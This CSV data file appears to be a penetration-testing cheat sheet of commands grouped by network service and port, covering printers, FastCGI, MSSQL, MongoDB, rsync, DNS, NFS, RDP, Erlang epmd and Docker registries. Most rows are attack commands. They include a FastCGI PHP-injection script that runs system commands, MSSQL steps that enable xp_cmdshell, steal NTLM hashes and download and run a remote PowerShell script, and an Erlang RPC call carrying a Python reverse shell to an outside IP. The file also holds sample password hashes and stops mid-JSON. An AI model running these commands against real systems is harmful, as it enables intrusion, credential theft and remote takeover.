Name,Port,Description,Cmd_Name,Cmd_Description,Cmd_Command,Cmd_Comment,SubDisplayOrder
PDL-datastream,9100,None,NoNameAdded,No Description,"# nc -vn {IP} 9100
@PJL INFO STATUS      #CODE=40000   DISPLAY=""Sleep""   ONLINE=TRUE
@PJL INFO ID          # ID (Brand an version): Brother HL-L2360D series:84U-F75:Ver.b.26
@PJL INFO PRODINFO    #Product info
@PJL FSDIRLIST NAME=""0:\"" ENTRY=1 COUNT=65535  #List dir
@PJL INFO VARIABLES   #Env variales
@PJL INFO FILESYS     #?
@PJL INFO TIMEOUT     #Timeout variables
@PJL RDYMSG           #Ready message
@PJL FSINIT  
@PJL FSDIRLIST
@PJL FSUPLOAD         #Useful to upload a file
@PJL FSDOWNLOAD       #Useful to download a file
@PJL FSDELETE         #Useful to delete a file
",Unverified,1
PDL-datastream,9100,None,NoNameAdded,No Description,"nmap -sV --script pjl-ready-message -p <PORT> {IP}
",Unverified,1
PDL-datastream,9100,None,NoNameAdded,No Description,"# msf> use auxiliary/scanner/printer/printer_env_vars
msf> use auxiliary/scanner/printer/printer_list_dir
msf> use auxiliary/scanner/printer/printer_list_volumes
msf> use auxiliary/scanner/printer/printer_ready_message
msf> use auxiliary/scanner/printer/printer_version_info
msf> use auxiliary/scanner/printer/printer_download_file
msf> use auxiliary/scanner/printer/printer_upload_file
msf> use auxiliary/scanner/printer/printer_delete_file
",Unverified,1
FastCGI,9000,None,NoNameAdded,No Description,"#!/bin/bash

PAYLOAD=""<?php echo '<!--'; system('whoami'); echo '-->';""
FILENAMES=""/var/www/public/index.php"" # Exisiting file path

HOST=$1
B64=$(echo ""$PAYLOAD""|base64)

for FN in $FILENAMES; do
    OUTPUT=$(mktemp)
    env -i \
      PHP_VALUE=""allow_url_include=1""$'\n'""allow_url_fopen=1""$'\n'""auto_prepend_file='data://text/plain\;base64,$B64'"" \
      SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
      cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT

    cat $OUTPUT
done
",Unverified,1
NetBios,137,None,NoNameAdded,No Description,"# PORT    STATE SERVICE    VERSION
137/udp open  netbios-ns Samba nmbd netbios-ns (workgroup: WORKGROUP)
",Unverified,1
NetBios,137,None,NoNameAdded,No Description,"nmblookup -A {IP}
nbtscan {IP}/30
sudo nmap -sU -sV -T4 --script nbstat.nse -p137 -Pn -n {IP}
",Unverified,1
NetBios,137,None,NoNameAdded,No Description,"# PORT    STATE         SERVICE     VERSION
138/udp open|filtered netbios-dgm
",Unverified,1
NetBios,137,None,NoNameAdded,No Description,"# PORT      STATE SERVICE      VERSION
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
",Unverified,1
MongoDB,27017,None,NoNameAdded,No Description,"# show dbs
use <db>
show collections
db.<collection>.find()  #Dump the collection
db.<collection>.count() #Number of records of the collection
db.current.find({""username"":""admin""})  #Find in current db the username admin
",Unverified,1
MongoDB,27017,None,NoNameAdded,No Description,"nmap -sV --script ""mongo* and default"" -p 27017 {IP} #By default all the nmap mongo enumerate scripts are used
",Unverified,1
MongoDB,27017,None,NoNameAdded,No Description,"mongo <HOST>
mongo <HOST>:<PORT>
mongo <HOST>:<PORT>/<DB>
mongo <database> -u <username> -p '<password>'
",Unverified,1
MongoDB,27017,None,NoNameAdded,No Description,"nmap -n -sV --script mongodb-brute -p 27017 <ip>
",Unverified,1
MongoDB,27017,None,NoNameAdded,No Description,"# grep ""noauth.*true"" /opt/bitnami/mongodb/mongodb.conf | grep -v ""^#"" #Not needed
grep ""auth.*true"" /opt/bitnami/mongodb/mongodb.conf | grep -v ""^#\|noauth"" #Not needed
",Unverified,1
ndmp,10000,None,NoNameAdded,No Description,"nmap -n -sV --script ""ndmp-fs-info or ndmp-version"" -p 10000 {IP} #Both are default scripts
",Unverified,1
Rsync,873,None,NoNameAdded,No Description,"nmap -sV --script ""rsync-list-modules"" -p <PORT> {IP}
msf> use auxiliary/scanner/rsync/modules_list

#Example using IPv6 and a different port
rsync -av --list-only rsync://[dead:beef::250:56ff:feb9:e90a]:8730
",Unverified,1
Rsync,873,None,NoNameAdded,No Description,"# rsync -av --list-only rsync://192.168.0.123/shared_name
",Unverified,1
Rsync,873,None,NoNameAdded,No Description,"# rsync -av rsync://192.168.0.123:8730/shared_name ./rsyn_shared
",Unverified,1
Rsync,873,None,NoNameAdded,No Description,"# rsync -av --list-only rsync://username@192.168.0.123/shared_name
rsync -av rsync://username@192.168.0.123:8730/shared_name ./rsyn_shared
",Unverified,1
Rsync,873,None,NoNameAdded,No Description,"# rsync -av home_user/.ssh/ rsync://username@192.168.0.123/home_user/.ssh
",Unverified,1
Rsync,873,None,NoNameAdded,No Description,"# find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
",Unverified,1
Server,1433,None,NoNameAdded,No Description,"searchsploit ""microsoft sql server""
nmap --script-help ""*ms* and *sql*""
msf> search mssql
",Unverified,1
Server,1433,None,NoNameAdded,No Description,"nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 {IP}
msf> use auxiliary/scanner/mssql/mssql_ping
",Unverified,1
Server,1433,None,NoNameAdded,No Description,"#Set USERNAME, RHOSTS and PASSWORD
#Set DOMAIN and USE_WINDOWS_AUTHENT if domain is used

#Steal NTLM
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer #Steal NTLM hash, before executing run Responder

#Info gathering
msf> use admin/mssql/mssql_enum #Security checks
msf> use admin/mssql/mssql_enum_domain_accounts
msf> use admin/mssql/mssql_enum_sql_logins
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/scanner/mssql/mssql_hashdump
msf> use auxiliary/scanner/mssql/mssql_schemadump

#Search for insteresting data
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/admin/mssql/mssql_idf

#Privesc
msf> use exploit/windows/mssql/mssql_linkcrawler
msf> use admin/mssql/mssql_escalate_execute_as #If the user has IMPERSONATION privilege, this will try to escalate
msf> use admin/mssql/mssql_escalate_dbowner #Escalate from db_owner to sysadmin

#Code execution
msf> use admin/mssql/mssql_exec #Execute commands
msf> use exploit/windows/mssql/mssql_payload #Uploads and execute a payload

#Add new admin user from meterpreter session
msf> use windows/manage/mssql_local_auth_bypass
",Unverified,1
Server,1433,None,NoNameAdded,No Description,"#Username + Password + CMD command
crackmapexec mssql -d <Domain name> -u <username> -p <password> -x ""whoami""
#Username + Hash + PS command
crackmapexec mssql -d <Domain name> -u <username> -H <HASH> -X '$PSVersionTable'

#this turns on advanced options and is needed to configure xp_cmdshell
sp_configure 'show advanced options', '1'
RECONFIGURE
#this enables xp_cmdshell
sp_configure 'xp_cmdshell', '1'
RECONFIGURE
# Quickly check what the service account is via xp_cmdshell
EXEC master..xp_cmdshell 'whoami'
",Unverified,1
Server,1433,None,NoNameAdded,No Description,"xp_dirtree '\\<attacker_{IP}>\any\thing'
exec master.dbo.xp_dirtree '\\<attacker_{IP}>\any\thing'
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer
",Unverified,1
Server,1433,None,NoNameAdded,No Description,"# msf> use auxiliary/admin/mssql/mssql_escalate_dbowner
",Unverified,1
Server,1433,None,NoNameAdded,No Description,"# msf> auxiliary/admin/mssql/mssql_escalate_execute_as
",Unverified,1
Server,1433,None,NoNameAdded,No Description,"mssqlclient.py  -db volume -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@{IP} #Recommended -windows-auth when you are going to use a domain. use as domain the netBIOS name of the machine

#Once logged in you can run queries:
SQL> select @@ version;

#Steal NTLM hash
sudo responder -I <interface> #Run that in other console
SQL> exec master..xp_dirtree '\\<YOUR_RESPONDER_IP>\test' #Steal the NTLM hash, crack it with john or hashcat

#Try to enable code execution
SQL> enable_xp_cmdshell

#Execute code, 2 sintax, for complex and non complex cmds
SQL> xp_cmdshell whoami /all
SQL> EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString(""http://10.10.14.13:8000/rev.ps1"") | powershell -noprofile'
",Unverified,1
Server,1433,None,NoNameAdded,No Description,"sqsh -S {IP} -U <Username> -P <Password> -D <Database>
",Unverified,1
Postgresql,5432,None,NoNameAdded,No Description,"psql -U <myuser> # Open psql console with user
psql -h <host< -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
",Unverified,1
Postgresql,5432,None,NoNameAdded,No Description,"log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
",Unverified,1
Postgresql,5432,None,NoNameAdded,No Description,"sqlite3 pgadmin4.db "".schema""
sqlite3 pgadmin4.db ""select * from user;""
sqlite3 pgadmin4.db ""select * from server;""
string pgadmin4.db
",Unverified,1
EthernetIP,44818,None,NoNameAdded,No Description,"nmap -n -sV --script enip-info -p 44818 {IP}
pip3 install cpppo
python3 -m cpppo.server.enip.list_services [--udp] [--broadcast] --list-identity -a {IP}
",Unverified,1
Portmapper,111,None,NoNameAdded,No Description,"# root@kali:~# apt-get install nis
root@kali:~# ypwhich -d example.org 192.168.10.1
potatohead.example.org
root@kali:~# ypcat –d example.org –h 192.168.10.1 passwd.byname
tiff:noR7Bk6FdgcZg:218:101::/export/home/tiff:/bin/bash 
katykat:d.K5tGUWCJfQM:2099:102::/export/home/katykat:/bin/bash 
james:i0na7pfgtxi42:332:100::/export/home/james:/bin/tcsh 
florent:nUNzkxYF0Hbmk:199:100::/export/home/florent:/bin/csh 
dave:pzg1026SzQlwc:182:100::/export/home/dave:/bin/bash 
yumi:ZEadZ3ZaW4v9.:1377:160::/export/home/yumi:/bin/bash
",Unverified,1
DNS,53,None,NoNameAdded,No Description,"dig version.bind CHAOS TXT @DNS
",Unverified,1
DNS,53,None,NoNameAdded,No Description,"dig axfr @<DNS_{IP}> #Try zone transfer without domain
dig axfr @<DNS_{IP}> <DOMAIN> #Try zone transfer guessing the domain
fierce -dns <DOMAIN> #Will try toperform a zone transfer against every authoritative name server and if this doesn'twork, will launch a dictionary attack
",Unverified,1
DNS,53,None,NoNameAdded,No Description,"dig ANY @<DNS_{IP}> <DOMAIN>     #Any information
dig A @<DNS_{IP}> <DOMAIN>       #Regular DNS request
dig AAAA @<DNS_{IP}> <DOMAIN>    #{IP}v6 DNS request
dig TXT @<DNS_{IP}> <DOMAIN>     #Information
dig MX @<DNS_{IP}> <DOMAIN>      #Emails related
dig NS @<DNS_{IP}> <DOMAIN>      #DNS that resolves that name
dig -x 192.168.0.2 @<DNS_{IP}>   #Reverse lookup
dig -x 2a00:1450:400c:c06::93 @<DNS_{IP}> #reverse {IP}v6 lookup

#Use [-p PORT]  or  -6 (to use ivp6 address of dns)
",Unverified,1
DNS,53,None,NoNameAdded,No Description,"nslookup
> SERVER <IP_DNS> #Select dns server
> 127.0.0.1 #Reverse lookup of 127.0.0.1, maybe...
> <IP_MACHINE> #Reverse lookup of a machine, maybe...
",Unverified,1
DNS,53,None,NoNameAdded,No Description,"auxiliary/gather/enum_dns #Perform enumeration actions
",Unverified,1
DNS,53,None,NoNameAdded,No Description,"#Perform enumeration actions
nmap -n --script ""(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport"" <IP>
",Unverified,1
DNS,53,None,NoNameAdded,No Description,"dnsrecon -r 127.0.0.0/24 -n <{IP}_DNS>  #DNS reverse of all of the addresses
dnsrecon -r 127.0.1.0/24 -n <{IP}_DNS>  #DNS reverse of all of the addresses
dnsrecon -r <{IP}_DNS>/24 -n <{IP}_DNS>   #DNS reverse of all of the addresses
dnsrecon -d active.htb -a -n <{IP}_DNS> #Zone transfer
",Unverified,1
DNS,53,None,NoNameAdded,No Description,"dnsrecon -D subdomains-1000.txt -d <DOMAIN> -n <{IP}_DNS>
dnscan -d <domain> -r -w subdomains-1000.txt #Bruteforce subdomains in recursive way, https://github.com/rbsec/dnscan
",Unverified,1
DNS,53,None,NoNameAdded,No Description," #Query paypal subdomains to ns3.isc-sns.info
 nmap -sSU -p53 --script dns-nsec-enum --script-args dns-nsec-enum.domains=paypal.com ns3.isc-sns.info
",Unverified,1
DNS,53,None,NoNameAdded,No Description,"dnsdict6 -s -t <domain>
",Unverified,1
DNS,53,None,NoNameAdded,No Description,"dnsrevenum6 pri.authdns.ripe.net 2001:67c:2e8::/48 #Will use the dns pri.authdns.ripe.net
",Unverified,1
DNS,53,None,NoNameAdded,No Description,"dig google.com A @{IP}
",Unverified,1
PPTP,1723,None,NoNameAdded,No Description,"nmap –Pn -sSV -p1723 {IP}
",Unverified,1
Service,2049,None,NoNameAdded,No Description,"nfs-ls #List NFS exports and check permissions
nfs-showmount #Like showmount -e
nfs-statfs #Disk statistics and info from NFS share
",Unverified,1
Service,2049,None,NoNameAdded,No Description,"scanner/nfs/nfsmount #Scan NFS mounts and list permissions
",Unverified,1
Service,2049,None,NoNameAdded,No Description,"# showmount -e {IP}
",Unverified,1
Service,2049,None,NoNameAdded,No Description,"mount -t nfs [-o vers=2] <ip>:<remote_folder> <local_folder> -o nolock
",Unverified,1
Service,2049,None,NoNameAdded,No Description,"mkdir /mnt/new_back
mount -t nfs [-o vers=2] 10.12.0.150:/backup /mnt/new_back -o nolock
",Unverified,1
RDP,3389,None,NoNameAdded,No Description,"rdesktop -u <username> {IP}
rdesktop -d <domain> -u <username> -p <password> {IP}
xfreerdp /u:[domain\]<username> /p:<password> /v:{IP}
xfreerdp /u:[domain\]<username> /pth:<hash> /v:{IP}
",Unverified,1
RDP,3389,None,NoNameAdded,No Description,"rdp_check <domain>/<name>:<password>@{IP}
",Unverified,1
RDP,3389,None,NoNameAdded,No Description,"nmap --script ""rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info"" -p 3389 -T4 {IP}
",Unverified,1
RDP,3389,None,NoNameAdded,No Description,"runas /netonly /user:<DOMAIN>\<NAME> ""cmd.exe"" #The password will be prompted
",Unverified,1
RDP,3389,None,NoNameAdded,No Description,"tscon <ID> /dest:<SESSIONNAME>
",Unverified,1
RDP,3389,None,NoNameAdded,No Description,"ts::sessions        #Get sessions
ts::remote /id:2    #Connect to the session
",Unverified,1
RDP,3389,None,NoNameAdded,No Description,"net localgroup ""Remote Desktop Users"" UserLoginName /add
",Unverified,1
Telnet,23,None,NoNameAdded,No Description,"# nc -vn {IP} 23
",Unverified,1
Telnet,23,None,NoNameAdded,No Description,"nmap -n -sV -Pn --script ""*telnet* and safe"" -p 23 {IP}
",Unverified,1
Telnet,23,None,NoNameAdded,No Description,"# /etc/inetd.conf
/etc/xinetd.d/telnet
/etc/xinetd.d/stelnet
",Unverified,1
epmd,4369,None,NoNameAdded,No Description,"echo -n -e ""\x00\x01\x6e"" | nc -vn {IP} 4369

#Via Erlang, Download package from here: https://www.erlang-solutions.com/resources/download.html
dpkg -i esl-erlang_23.0-1~ubuntu~xenial_amd64.deb
apt-get install erlang
erl #Once Erlang is installed this will promp an erlang terminal
1> net_adm:names('<HOST>'). #This will return the listen addresses
",Unverified,1
epmd,4369,None,NoNameAdded,No Description,"nmap -sV -Pn -n -T4 -p 4369 --script epmd-info {IP}

PORT     STATE SERVICE VERSION
4369/tcp open  epmd    Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|     bigcouch: 11502
|     freeswitch: 8031
|     ecallmgr: 11501
|     kazoo_apps: 11500
|_    kazoo-rabbitmq: 25672
",Unverified,1
epmd,4369,None,NoNameAdded,No Description,"greif@baldr ~$ erl -cookie YOURLEAKEDCOOKIE -name test2 -remsh test@target.fqdn
Erlang/OTP 19 [erts-8.1] [source] [64-bit] [async-threads:10]

Eshell V8.1 (abort with ^G)

At last, we can start an erlang shell on the remote system.

(test@target.fqdn)1>os:cmd(""id"").
""uid=0(root) gid=0(root) groups=0(root)\n""
",Unverified,1
epmd,4369,None,NoNameAdded,No Description,"HOME=/ erl -sname anonymous -setcookie YOURLEAKEDCOOKIE 
(anonymous@canape)1> rpc:call('couchdb@localhost', os, cmd, [whoami]).
""homer\n""
(anonymous@canape)4> rpc:call('couchdb@localhost', os, cmd, [""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""10.10.14.9\"", 9005));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\""/bin/sh\"",\""-i\""]);'""]).
",Unverified,1
epmd,4369,None,NoNameAdded,No Description,"#Metasploit can also exploit this if you know the cookie
msf5> use exploit/multi/misc/erlang_cookie_rce
",Unverified,1
Registry,5000,None,NoNameAdded,No Description,"curl -s http://10.10.10.10:5000/v2/_catalog
#If HTTPS
Warning: Binary output can mess up your terminal. Use ""--output -"" to tell 
Warning: curl to output it to your terminal anyway, or consider ""--output 
Warning: <FILE>"" to save to a file.

#If HTTP
{""repositories"":[""alpine"",""ubuntu""]}
",Unverified,1
Registry,5000,None,NoNameAdded,No Description,"curl -k https://192.25.197.3:5000/v2/_catalog
#If Authentication required
{""errors"":[{""code"":""UNAUTHORIZED"",""message"":""authentication required"",""detail"":[{""Type"":""registry"",""Class"":"""",""Name"":""catalog"",""Action"":""*""}]}]}
#If no authentication required
{""repositories"":[""alpine"",""ubuntu""]}
",Unverified,1
Registry,5000,None,NoNameAdded,No Description,"curl -k -u username:password https://10.10.10.10:5000/v2/_catalog
",Unverified,1
Registry,5000,None,NoNameAdded,No Description,"#List repositories
curl -s http://10.10.10.10:5000/v2/_catalog
{""repositories"":[""alpine"",""ubuntu""]}

#Get tags of a repository
curl -s http://192.251.36.3:5000/v2/ubuntu/tags/list
{""name"":""ubuntu"",""tags"":[""14.04"",""12.04"",""18.04"",""16.04""]}

#Get manifests
curl -s http://192.251.36.3:5000/v2/ubuntu/manifests/latest
{
   ""schemaVersion"": 1,
   ""name"": ""ubuntu"",
   ""tag"": ""latest"",
   ""architecture"": ""amd64"",
   ""fsLayers"": [
      {
         ""blobSum"": ""sha256:2a62ecb2a3e5bcdbac8b6edc58fae093a39381e05d08ca75ed27cae94125f935""
      },
      {
         ""blobSum"": ""sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4""
      },
      {
         ""blobSum"": ""sha256:e7c96db7181be991f19a9fb6975cdbbd73c65f4a2681348e63a141a2192a5f10""
      }
   ],
   ""history"": [
      {
         ""v1Compatibility"": ""{\""architecture\"":\""amd64\"",\""config\"":{\""Hostname\"":\""\"",\""Domainname\"":\""\"",\""User\"":\""\"",\""AttachStdin\"":false,\""AttachStdout\"":false,\""AttachStderr\"":false,\""Tty\"":false,\""OpenStdin\"":false,\""StdinOnce\"":false,\""Env\"":[\""PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\""],\""Cmd\"":[\""/bin/sh\""],\""ArgsEscaped\"":true,\""Image\"":\""sha256:055936d3920576da37aa9bc460d70c5f212028bda1c08c0879aedf03d7a66ea1\"",\""Volumes\"":null,\""WorkingDir\"":\""\"",\""Entrypoint\"":null,\""OnBuild\"":null,\""Labels\"":null},\""container_config\"":{\""Hostname\"":\""\"",\""Domainname\"":\""\"",\""User\"":\""\"",\""AttachStdin\"":false,\""AttachStdout\"":false,\""AttachStderr\"":false,\""Tty\"":false,\""OpenStdin\"":false,\""StdinOnce\"":false,\""Env\"":[\""PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\""],\""Cmd\"":[\""/bin/sh\"",\""-c\"",\""#(nop) COPY file:96c69e5db7e6d87db2a51d3894183e9e305a144c73659d5578d300bd2175b5d6 in /etc/network/if-post-up.d \""],\""ArgsEscaped\"":true,\""Image\"":\""sha256:055936d3920576da37aa9bc460d70c5f212028bda1c08c0879aedf03d7a66ea1\"",\""Volumes\"":null,\""WorkingDir\"":\""\"",\""Entrypoint\"":null,\""OnBuild\"":null,\""Labels\"":null},\""created\"":\""2019-05-13T14:06:51.794876531Z\"",\""docker_version\"":\""18.09.4\"",\""id\"":\""911999e848d2c283cbda4cd57306966b44a05f3f184ae24b4c576e0f2dfb64d0\"",\""os\"":\""linux\"",\""parent\"":\""ebc21e1720595259c8ce23ec8af55eddd867a57aa732846c249ca59402072d7a\""}""
      },
      {
         ""v1Compatibility"": ""{\""id\"":\""ebc21e1720595259c8ce23ec8af55eddd867a57aa732846c249ca59402072d7a\"",\""parent\"":\""7869895562ab7b1da94e0293c72d05b096f402beb83c4b15b8887d71d00edb87\"",\""created\"":\""2019-05-11T00:07:03.510395965Z\"",\""container_config\"":{\""Cmd\"":[\""/bin/sh -c #(nop)  CMD [\\\""/bin/sh\\\""]\""]},\""throwaway\"":true}""
      },
      {
         ""v1Compatibility"": ""{\""id\"":\""7869895562ab7b1da94e0293c72d05b096f402beb83c4b15b8887d71d00edb87\"",\""created\"":\""2019-05-11T00:07:03.358250803Z\"",\""container_config\"":{\""Cmd\"":[\""/bin/sh -c #(nop) ADD file:a86aea1f3a7d68f6ae03397b99ea77f2e9ee901c5c59e59f76f93adbb4035913 in / \""]}}""
      }
   ],
   ""signatures"": [
      {
         ""header"": {
            ""jwk"": {
               ""crv"": ""P-256"",
               ""kid"": ""DJNH:N6JL:4VOW:OTHI:BSXU:TZG5:6VPC:D6BP:6BPR:ULO5:Z4N4:7WBX"",
               ""kty"": ""EC"",
               ""x"": ""leyzOyk4EbEWDY0ZVDoU8_iQvDcv4hrCA0kXLVSpCmg"",
               ""y"": ""Aq5Qcnrd-6RO7VhUS2KPpftoyjjBWVoVUiaPluXq4Fg""
            },
            ""alg"": ""ES256""
         },
         ""signature"": ""GIUf4lXGzdFk3aF6f7IVpF551UUqGaSsvylDqdeklkUpw_wFhB_-FVfshodDzWlEM8KI-00aKky_FJez9iWL0Q"",
